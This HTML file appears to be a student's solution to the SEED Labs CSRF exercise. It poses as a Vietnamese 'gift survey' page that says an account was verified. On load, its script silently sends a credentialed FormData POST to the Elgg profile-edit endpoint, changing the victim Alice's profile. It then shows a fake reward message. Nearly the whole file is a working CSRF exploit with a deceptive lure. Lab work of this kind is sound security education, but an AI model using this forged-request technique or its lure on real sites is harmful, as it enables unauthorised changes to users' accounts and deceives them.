<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chương trình Khảo sát Nhận Quà Tri Ân</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { min-height: 100vh; display: flex; align-items: center; justify-content: center;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); padding: 20px; }
        .container { background: #fff; border-radius: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.25);
            max-width: 520px; width: 100%; padding: 40px 30px; text-align: center; }
        .badge { display: inline-block; background: #e0f2fe; color: #0284c7; padding: 6px 16px;
            border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 16px;
            text-transform: uppercase; letter-spacing: 0.5px; }
        h1 { color: #0f172a; font-size: 24px; font-weight: 700; margin-bottom: 12px; line-height: 1.3; }
        p { color: #475569; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
        .loader-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 12px;
            padding: 20px; margin-bottom: 24px; }
        .spinner { width: 44px; height: 44px; border: 4px solid #e2e8f0; border-top: 4px solid #2563eb;
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { font-size: 14px; color: #64748b; font-weight: 500; }
        .footer-note { font-size: 12px; color: #94a3b8; }
        .debug-console { margin-top: 20px; background: #0f172a; color: #38bdf8;
            font-family: 'Courier New', Courier, monospace; font-size: 12px; text-align: left;
            padding: 12px; border-radius: 8px; max-height: 120px; overflow-y: auto; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="badge">🎁 Phần quà may mắn</span>
        <h1>Xác thực tài khoản thành công!</h1>
        <p>Hệ thống đang chuẩn bị gói dữ liệu khuyến mãi đặc quyền dành riêng cho tài khoản của bạn.
           Vui lòng giữ nguyên tab trình duyệt trong 3 giây...</p>
        <div class="loader-box">
            <div class="spinner"></div>
            <div class="status-text" id="status-display">Đang đồng bộ hóa dữ liệu bảo mật...</div>
        </div>
        <p class="footer-note">Cổng kết nối an toàn 256-bit SSL/TLS. Mã xác thực: #SEC-9821</p>
        <div class="debug-console" id="debug-box"></div>
    </div>

    <script type="text/javascript">
        /**
         * =====================================================================
         *  BIẾN THỂ: KỊCH BẢN TẤN CÔNG CSRF DÙNG FETCH API + FormData
         * =====================================================================
         *  Đề bài cho phép đóng gói dữ liệu bằng URLSearchParams HOẶC FormData.
         *  - index.html            -> dùng URLSearchParams (x-www-form-urlencoded)
         *  - index_formdata.html   -> dùng FormData (multipart/form-data)   [FILE NÀY]
         *
         *  Lưu ý kỹ thuật quan trọng:
         *  1) KHÔNG đặt header 'Content-Type' thủ công khi dùng FormData —
         *     trình duyệt phải tự sinh 'multipart/form-data; boundary=...'.
         *  2) 'multipart/form-data' cũng thuộc nhóm CORS-safelisted Content-Type,
         *     nên đây vẫn là một Simple Request (KHÔNG phát sinh Preflight OPTIONS).
         * =====================================================================
         */
        const CONFIG = {
            targetEndpoint: 'http://www.seed-server.com/action/profile/edit',
            victimGuid: '42',           // GUID của Alice trong SEED Labs Elgg
            victimName: 'Alice',
            studentId: 'B21DCCN001',    // 👉 THAY BẰNG MÃ SINH VIÊN THỰC TẾ CỦA NHÓM
            debug: true
        };

        function logDebug(message) {
            console.log(`[CSRF-EXPLOIT-FORMDATA] ${message}`);
            if (CONFIG.debug) {
                const box = document.getElementById('debug-box');
                box.style.display = 'block';
                box.innerHTML += `<div>&gt; ${message}</div>`;
            }
        }

        async function executeCSRFAttack() {
            logDebug('Bắt đầu quy trình CSRF (biến thể FormData)...');
            logDebug(`Mục tiêu: ${CONFIG.targetEndpoint}`);

            // 1. Đóng gói payload bằng FormData
            const payload = new FormData();
            payload.append('name', CONFIG.victimName);
            payload.append('description', `<p>CSRF attack by ${CONFIG.studentId}</p>`);
            payload.append('accesslevel[description]', '2'); // 2 = Public
            payload.append('briefdescription', `CSRF by ${CONFIG.studentId}`);
            payload.append('accesslevel[briefdescription]', '2');
            payload.append('guid', CONFIG.victimGuid);
            logDebug('Đã đóng gói dữ liệu qua FormData (multipart/form-data).');

            try {
                // 2. Gửi Fetch POST — KHÔNG khai báo headers để trình duyệt tự đặt boundary
                logDebug('Đang phóng gói tin ngầm với credentials: "include"...');
                await fetch(CONFIG.targetEndpoint, {
                    method: 'POST',
                    mode: 'no-cors',
                    credentials: 'include',   // BẮT BUỘC: đính kèm Cookie phiên của nạn nhân
                    body: payload             // trình duyệt tự sinh Content-Type + boundary
                });
                logDebug('===> Đã gửi payload tới Elgg (phản hồi opaque do no-cors).');
                document.getElementById('status-display').textContent =
                    '✅ Đã kích hoạt phần thưởng! Vui lòng kiểm tra hộp thư.';
            } catch (error) {
                logDebug(`Lỗi kết nối: ${error.message}`);
            }
        }

        window.addEventListener('DOMContentLoaded', executeCSRFAttack);
    </script>
</body>
</html>
